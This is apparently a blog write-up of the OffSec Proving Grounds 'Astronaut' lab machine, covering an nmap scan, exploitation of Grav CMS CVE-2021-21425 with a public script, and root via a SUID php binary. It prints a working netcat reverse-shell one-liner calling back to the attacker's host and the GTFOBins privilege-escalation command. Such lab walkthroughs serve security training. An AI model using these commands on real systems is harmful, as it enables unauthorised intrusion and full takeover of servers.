---
title: "Proving grounds Play: Astronaut"
layout: post
date: 2023-10-05 03:00
tag: 
- CTF
- Offsec labs
- OSCP
- Writeup
- Linux
- PG-Practice
- Grav-CMS
writeups: true
hidden: true
author: Naveen
description: "Offsec proving grounds practice linux machine writeup"
---

## Nmap

```text
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 984e5de1e697296fd9e0d482a8f64f3f (RSA)
|   256 5723571ffd7706be256661146dae5e98 (ECDSA)
|_  256 c79baad5a6333591341eefcf61a8301c (ED25519)
80/tcp open  http    Apache httpd 2.4.41
|_http-title: Index of /
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2021-03-17 17:46  grav-admin/
|_
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## 80/tcp open  http - Apache httpd 2.4.41

http://192.168.192.12/grav-admin/

![img](/assets/images/CTF/Proving_Grounds/Astronaut/web.png)

Grav CMS is vulnerable to [Grav CMS Unauthenticated RCE (CVE-2021-21425)](https://www.acunetix.com/vulnerabilities/web/grav-cms-unauthenticated-rce-cve-2021-21425/).

## Exploitation

Find the remode code execution exploit from [GitHub](https://github.com/CsEnox/CVE-2021-21425).

Run the exploit as below.

```sh
naveenj@hackerspace:|06:22|~/proving_grounds/Astronaut/exploit$ python3 exploit.py -t http://192.168.192.12/grav-admin -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.198 4444 >/tmp/f'
[*] Creating File
Scheduled task created for file creation, wait one minute
[*] Running file
Scheduled task created for command, wait one minute
Exploit completed
```

**Reverse Shell**

```sh
naveenj@hackerspace:|06:24|~/proving_grounds/Astronaut/exploit$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.45.198] from (UNKNOWN) [192.168.192.12] 58968
sh: 0: can't access tty; job control turned off
$ 
```

## Privilege Escalation

Check the SUID binaries.

```sh
$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/php7.4         #exploitable
$ 
```

Check GTFO bins for exploit.

### GTFO Bins exploit

**SUID**

If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

`php -r "pcntl_exec('/bin/sh', ['-p']);"`

### Exploitation

```sh
$ which php
/usr/bin/php
$ /usr/bin/php -r "pcntl_exec('/bin/sh', ['-p']);"
id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
whoami
root
```

**Root Obtained**

Thanks for reading!

For more insights and updates, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).